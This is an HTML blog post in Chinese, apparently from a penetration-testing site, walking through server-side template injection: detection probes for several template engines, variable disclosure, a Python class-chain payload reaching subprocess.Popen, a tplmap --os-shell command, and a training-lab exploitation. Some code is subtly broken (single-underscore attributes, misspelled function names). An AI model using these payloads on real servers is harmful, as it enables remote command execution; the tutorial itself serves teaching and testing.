@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en-us">
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+  
+  <meta name="viewport" content="width=device-width,minimum-scale=1,maximum-scale=1">
+
+  
+    
+    
+      <link href="/css/fonts.css" rel="stylesheet" type="text/css">
+    
+  
+
+  
+  <title>Templet Injection</title>
+
+  
+  
+  <link rel="stylesheet" href="/css/hugo-octopress.css">
+
+  
+  
+
+  
+    <link rel="stylesheet" href="/css/fork-awesome.min.css">
+  
+
+  
+  <link href="https://GETC2.github.io/favicon.png" rel="icon">
+
+  
+  
+
+  <meta name="description" content="" />
+  <meta name="keywords" content="">
+  <meta name="author" content="KUHAKU">
+
+  
+  <meta name="generator" content="Hugo 0.78.0" />
+
+  
+  
+
+  
+  
+</head>
+<body>
+
+
+<header role="banner">
+<hgroup>
+  
+  <h1><a href="https://GETC2.github.io/">GET command and control</a></h1>
+    <h2>Stay hungry. Stay foolish.</h2>
+</hgroup></header>
+
+
+<nav role="navigation">
+<fieldset class="mobile-nav">
+  
+  <select onchange="location = this.value;">
+    <option value="">Navigate…</option>
+      
+  </select>
+</fieldset>
+
+
+<ul class="main-navigation">
+  
+  
+</ul>
+
+<ul class="subscription">
+  
+</ul>
+
+
+</nav>
+
+
+<div id="main">
+  <div id="content">
+    <div>
+      <article class="hentry" role="article">
+
+        
+        
+
+<header>
+  <p class="meta">Mar 4, 2021
+     - 4 minute read 
+    
+
+    
+    
+      - <a class="label" href="https://GETC2.github.io/categories/web-pentesting/">Web Pentesting </a>
+    
+  </p>
+  <h1 class="entry-title">
+     Templet Injection 
+  </h1>
+</header>
+
+
+        <div class="entry-content">
+          
+          
+          
+          <h1 id="templet-injection">Templet Injection</h1>
+<p>关于什么是模板注入，这里就不多说了。主要记录一下模板注入漏洞的利用流程。</p>
+<ol>
+<li>
+<p>发现模板注入漏洞</p>
+<p>不同框架利用的模板引擎不同，所使用的模板语言也就不同。但是发现漏洞的方法是一致的。一般都是通过再用户控制的输入中插入模板语言定义的逻辑操作，比如数学计算：</p>
+<pre><code>@(2*2) //Razor
+${2*2} //Freemarker
+{{2*2}} //Twig, Mustache, Jinja2
+{$2*2} // Smarty
+&lt;%=2*2%&gt; // eRB, eJS
+</code></pre><p>如果服务端返回的页面中有该操作执行后的结果，则说明该输入可以注入模板。</p>
+<p>亦或者，我们可以插入语法错误的模板，比如在输入末尾加<code>}</code>，如果返回的页面出现错误的话，这说明该处输入可以注入模板。</p>
+</li>
+<li>
+<p>利用模板注入漏洞</p>
+<ul>
+<li>
+<p>读取内部变量</p>
+<p>我们可以利用该漏洞读取服务端的变量。比如：</p>
+<pre><code># Python and Jinja
+{{ self }} //引用当前的类
+{{ variable }} //获取当前传入变量的值
+     
+# Ruby and eRB
+&lt;%= self $&gt; //引用当前的类
+&lt;%= self.methods $&gt; //引用当前的类的方法
+</code></pre></li>
+<li>
+<p>远程代码执行</p>
+<p>以<code>Python</code>为例，我们可以通过<code>subprocess.popen</code>来执行代码。那么如何在模板引擎语言中调用相关的类呢？我们可以通过<code>Python</code>的继承来获取对<code>subprocess</code>类的引用：</p>
+<pre><code class="language-'" data-lang="'">''._class_ //返回字符串‘’的类
+''._class_._mro_ //返回一个元组，元组中的成员为类，根据元组中类的顺序决定调用方法时的查找顺序
+''._class_._mro_[2]._subclasses_() //由于之前返回的元组中的第三个元素为object,它是所有类的父类，通过_subclasses方法可以得到Python中所有的类
+''._class_._mro_[2]._subclasses_()[9]([&quot;ping -c4 ip&quot;, shell=True]) //如果之前返回的所有子类中的第十个为process.popen，我们就可以利用该类来执行命令
+</code></pre></li>
+</ul>
+</li>
+</ol>
+<p>除了手动发现和利用模板注入漏洞，我们还可以借助现有的工具。比如<code>Tplmap.py</code>。除了脚本外，该工具还有<code>burpsuite</code>的插件版本。我们可以通过指明<code>GET</code>的参数，<code>POST</code>的参数或者<code>HTTP</code>头部为注入点，然后指明要利用的方向：比如生成<code>shell</code>，执行具体的命令等等。以下就是指明<code>POST</code>参数为注入点，并要求生成<code>shell</code>时的命令行选项：</p>
+<pre><code>./tplmap.py -u 'http://example.com/test' --data='ssti=test' --os-shell
+</code></pre><h2 id="实验">实验</h2>
+<h3 id="目的">目的</h3>
+<p>目标域名为: <code>http://flask.sec642.org</code>，我们需要发现模板注入漏洞并利用该漏洞执行<code>ping</code>命令。</p>
+<h3 id="步骤">步骤</h3>
+<p>目标域名默认页面中有一个链接，点进去发现以下页面：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/GETC2/blog-pics@master/img/Snipaste_2021-03-04_21-15-04.png" alt=""></p>
+<p>可以发现，这是带参数的链接，且参数被输出到页面中。如果该页面是通过模板创建的话，那么我们说不定可以通过该参数来进行模板注入。</p>
+<p>同时我们可以接触到服务端处理此请求的代码：</p>
+<pre><code>@app.route('/books')
+def book_ssti():
+    books = {'name': 'Mostly Harmless', 'flag': 'not shown'}
+if requests.args.get('book'):
+    person['book'] = request.args.get('book')
+templet = 'ommited'
+return render_templet_string(templet, books=books)
+</code></pre><p>从以上代码可以看到，我们的参数确实有可能不经处理就被传入模板，而且变量<code>books</code>和模板一起作为函数<code>render_templet_string</code>参数进行渲染。那么我们就可以通过显示变量<code>books</code>的值来验证是否存在模板注入漏洞：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/GETC2/blog-pics@master/img/Snipaste_2021-03-04_21-30-30.png" alt=""></p>
+<p>可以看到，当我们构造的参数为：<code>{{books.flag._class_}}</code>时，页面上对应参数的输出为变量扩展之后的结果。这说明此处有模板注入漏洞。</p>
+<p>然后我们直接进入到远程代码执行，正如之前所说，我们可以利用<code>Python</code>中的<code>subprocess.popen</code>类来执行命令。而这需要我们知道该类在<code>books.flag._class_._mro_[2]._subclasses_()</code>所返回的结果中的位置。我们直接构造参数为<code>books.flag._class_._mro_[2]._subclasses_()</code>，然后观察<code>process.popen</code>的位置。我们略去该过程，知道该类的索引为230。</p>
+<p>最后就直接构造可以执行命令的参数了。我们现在本地执行以下命令：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/GETC2/blog-pics@master/img/Snipaste_2021-03-04_21-38-28.png" alt=""></p>
+<p>如果<code>ping</code>命令成功执行，那么应该<code>tcpdump</code>应该会捕获响应。然后执行命令：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/GETC2/blog-pics@master/img/Snipaste_2021-03-04_21-38-13.png" alt=""></p>
+<h2 id="总结">总结</h2>
+<p>现在的<code>Web</code>后端框架一般都是基于<code>MVC</code>。这些框架为了方便生成动态页面，一般都通过某种模板引擎来实现，这就给我们带来了模板注入漏洞的可能性。我们可以以上介绍的方法来测试这种类型的漏洞，其中利用方法包括变量泄露，远程代码执行。</p>
+
+        </div>
+        
+
+<footer>
+  <p class="meta">
+    <span class="byline author vcard">Posted by <span class="fn">KUHAKU</span></span>
+    
+    <time>Mar 4, 2021</time>
+    
+    </span>
+  </p>
+
+  
+
+  <p class="meta">
+    
+        <a class="basic-alignment left" href="https://GETC2.github.io/post/file-inclusion/" title="File Inclusion">File Inclusion</a>
+    
+
+    
+  </p>
+  
+</footer>
+
+      </article>
+    </div>
+    
+
+<aside class="sidebar thirds">
+  <section class="first odd">
+
+    
+
+    <p>
+      
+    </p>
+  </section>
+
+
+
+  
+  <ul class="sidebar-nav">
+    <li class="sidebar-nav-item">
+      
+      
+      
+      
+      
+         
+      
+      
+      
+      
+      
+      
+      
+
+    
+    
+    </li>
+  </ul>
+
+  
+
+  
+    
+      <section class="odd">
+        
+          <h1>分类</h1>
+        
+        
+          <li>
+            <a href="https://GETC2.github.io/categories/reverse-engineering/" title="Reverse Engineering" >Reverse Engineering</a>
+          </li>
+        
+          <li>
+            <a href="https://GETC2.github.io/categories/web-pentesting/" title="Web Pentesting" >Web Pentesting</a>
+          </li>
+        
+      </section>
+    
+  
+
+  
+  
+  
+</aside>
+
+  </div>
+</div>
+
+    <footer role="contentinfo">
+      <p>Copyright &copy; 2021 KUHAKU - <a href="https://GETC2.github.io/license/">License</a> -
+        <span class="credit">Powered by <a target="_blank" href="https://gohugo.io" rel="noopener noreferrer">Hugo</a> and <a target="_blank" href="https://github.com/parsiya/hugo-octopress/" rel="noopener noreferrer">Hugo-Octopress</a> theme.
+      </p>
+    </footer>
+
+    
+    
+    
+
+    
+  </body>
+</html>
+
